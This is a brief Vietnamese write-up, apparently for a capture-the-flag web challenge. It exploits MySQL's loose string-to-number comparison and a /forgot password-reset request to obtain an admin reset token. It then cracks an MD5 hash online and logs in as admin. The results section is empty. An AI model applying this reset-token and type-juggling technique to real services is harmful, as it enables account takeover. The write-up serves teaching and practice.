# Solution

Khai thác ở bug loggic của mysql

```
mysql> select "123abcdef"=123;
+-----------------+
| "123abcdef"=123 |
+-----------------+
|               1 |
+-----------------+
1 row in set, 1 warning (0.00 sec)
```


POST đến `/forgot` với `{"step":1, "username": "admin"}` để lấy `reset_token` của admin



=> `234d8ccedc7bea108573a7e669dd111f`

[md5crack](https://hashes.com/en/decrypt/hash) -> `8e30b8`

Login với password là `8e30`


Kết quả



